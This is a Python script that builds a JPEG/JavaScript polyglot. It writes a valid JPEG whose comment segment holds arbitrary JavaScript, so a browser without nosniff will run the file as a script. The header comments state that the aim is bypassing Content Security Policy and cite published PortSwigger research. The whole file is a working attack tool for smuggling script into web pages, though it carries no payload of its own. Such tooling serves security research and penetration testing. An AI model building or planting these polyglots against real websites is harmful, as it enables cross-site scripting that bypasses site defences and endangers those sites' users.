#!/usr/bin/env python
#
# Copyright (C) 2021 Matthew Baker, all rights reserved.
#
# Copyrighted under GPL-3.0-only.
#
#
# Create a Polyglot JPEG/JavaScript binary
#
# This will display as an image with
# <img src="hackedimage.jpg">
# Many browsers, without nosniff, will execute it as JavaScript with
# <script charset="ISO-8859-1" src="hackedimage.jpg"></script> 
#
# Note that some browsers need the charset set, otherwise they expect
# UTF-8, which will cause it to break.
#
# The image must be small, otherwise the browser will not detect it as
# JavaScript.  Try 256x256.  512x512 is too big,
#
# Inspired by Gareth Heyes post at PortSwigger, 
# https://portswigger.net/research/bypassing-csp-using-polyglot-jpegs

from binascii import unhexlify
import argparse
import sys

def skipheader(image, idx):
    len1 = image[idx]
    len2 = image[idx+1]
    header_len = (len1 << 8) + len2
    print("Skipping header starting byte " + str(idx) + " (" + str(header_len) + " bytes)")
    if (len(image) - idx < header_len):
        print("Invalid JPEG image - badly formed header starting at byte " + str(idx) + " - " + args.image)
        sys.exit(1)
    return header_len + idx

# parse command line
parser = argparse.ArgumentParser(description='Create a polyplot JPEG/JavaScript file')
requiredNamed = parser.add_argument_group('required named arguments')
requiredNamed.add_argument('-i', '--image', metavar='input-image', type=str, help='Original image', required=True)
requiredNamed.add_argument('-j', '--js', metavar='input-javascript', type=str, help='JavaScript to embed', required=True)
requiredNamed.add_argument('-o', '--output', metavar='output-jpg', type=str, help='Output JPEG image', required=True)
args = parser.parse_args()

# read JavaScript
with open (args.js, "r") as file:
    javascript = file.read()

# read image
with open (args.image, "rb") as file:
    image = bytearray(file.read())

# skip past headers
idx = 0
if (len(image) < 8):
    print("Invalid JPEG image - too short - " + args.image)
    sys.exit(1)
if (image[idx] != 0xff or image[idx+1] != 0xd8):
    print("Invalid JPEG image - JPEG header not found - " + args.image)
    sys.exit(1)
idx += 2
while (len(image) - idx > 2 and image[idx] == 0xff and \
    ((image[idx+1] >= 0xe0 and image[idx+1] <= 0xef) or \
    image[idx+1] == 0xfe)): 
    idx += 2
    idx = skipheader(image, idx)

imagedata = image[idx:-2]
if (imagedata.find(b'*/') >= 0):
    print("Image data contains the byte * followed by / will will break the JPEG.  Try a smaller image or recoding it")
    sys.exit(1)

print("Using input image bytes starting at " + str(idx))

outfile = open(args.output, 'wb')

outfile.write(unhexlify('FFD8FFE0')) # JPEG identifier and JFIF header
outfile.write(unhexlify('2F2A')) # JFIF length - 12074 bytes total
outfile.write(unhexlify('4A46494600')) # JFIF header
outfile.write(unhexlify('0101')) # JFIF version
outfile.write(unhexlify('0100480048')) # pixel density 
outfile.write(unhexlify('0000')) # thumbnail 
#outfile.write(unhexlify('093A4A4649462F2A010100480048'))
padding = bytearray(12074-16)
outfile.write(padding) # padd JFIF header

# JPEG comment header containing the JavaScript
outfile.write(unhexlify('FFFE'))  # comment marker
comment_length = len(javascript) + 5 + 2 # /*= ... */ plus the two size bytes
if (comment_length > 65535):
    print("Javascript is too long - must be 65528 characters or less")
    sys.exit(1)
size_hex = '{:04x}'.format(comment_length,'x')
outfile.write(unhexlify(size_hex))
outfile.write(unhexlify('2A2F3D')) # */=
outfile.write(javascript.encode('ascii')) # our JavaScript code
outfile.write(unhexlify('2F2A')) # /*


outfile.write(imagedata) # input image minus header, comments and end marker

# another comment at the end to close the JavaScript comment
outfile.write(unhexlify('FFFE00062A2F2F2F')) # /*=

outfile.write(unhexlify('FFD9')) # end of JPEG marker

outfile.close()


